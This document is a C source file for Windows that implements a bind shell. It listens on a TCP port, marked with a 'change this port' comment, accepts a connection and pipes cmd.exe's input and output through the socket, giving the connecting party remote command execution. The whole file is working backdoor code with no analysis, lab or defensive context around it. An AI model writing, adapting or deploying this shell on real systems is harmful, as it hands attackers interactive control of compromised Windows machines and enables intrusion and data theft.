#include <windows.h>

SOCKET client;
HANDLE hInboundR, hInboundW, hOutboundR, hOutboundW;


DWORD WINAPI ThreadInbound(LPVOID lpParameter)
{
    char buf[1024];
    int sz;
    DWORD dwSize;

    for (;;)
    {
        sz = recv(client, buf, 1024, 0);
        if (sz > 0) WriteFile(hInboundW, buf, (DWORD)sz, &dwSize, NULL);
    }
}




DWORD WINAPI ThreadOutbound(LPVOID lpParameter)
{
    char buf[1024];
    DWORD dwSize;

    for (;;)
    {
        dwSize = 0;
        ReadFile(hOutboundR, buf, 1024, &dwSize, NULL);
        if ((int)dwSize > 0) send(client, buf, (int)dwSize, 0);
    }
}


void main()
{
    WSADATA wd;
    struct sockaddr_in sa;
    SOCKET s;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sec;
    DWORD dwSize;
    HANDLE hThIn, hThOut;

    
    WSAStartup(0x202, &wd);
    

    
    memset(&sa, 0, sizeof(struct sockaddr));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(19500); // change this port
    

    
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    bind(s, (struct sockaddr *)&sa, sizeof(struct sockaddr));
    listen(s, 0x5);
    client = accept(s, NULL, NULL);
    

    
    sec.nLength = sizeof(SECURITY_ATTRIBUTES);
    sec.bInheritHandle = TRUE;
    sec.lpSecurityDescriptor = NULL;
    ///

    
    CreatePipe(&hInboundR, &hInboundW, &sec, 0);
    CreatePipe(&hOutboundR, &hOutboundW, &sec, 0);
    

    
    memset(&si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;

    si.hStdInput = hInboundR;
    si.hStdOutput = hOutboundW;
    DuplicateHandle(GetCurrentProcess(), hOutboundW, GetCurrentProcess(), &si.hStdError, DUPLICATE_SAME_ACCESS, TRUE, 0);

    CreateProcess(NULL, "cmd.exe", &sec, &sec, TRUE, CREATE_NEW_CONSOLE | CREATE_DEFAULT_ERROR_MODE | HIGH_PRIORITY_CLASS, NULL, NULL, &si, &pi);
    

    
    hThOut = CreateThread(&sec, 0, ThreadOutbound, NULL, 0, &dwSize);
    hThIn = CreateThread(&sec, 0, ThreadInbound, NULL, 0, &dwSize);
    WaitForSingleObject(pi.hProcess, INFINITE);
    

    
    TerminateThread(hThIn, 0);
    TerminateThread(hThOut, 0);
    CloseHandle(hThIn);
    CloseHandle(hThOut);
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(hInboundR);
    CloseHandle(hInboundW);
    CloseHandle(hOutboundR);
    CloseHandle(hOutboundW);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    closesocket(s);
    WSACleanup();
    
}

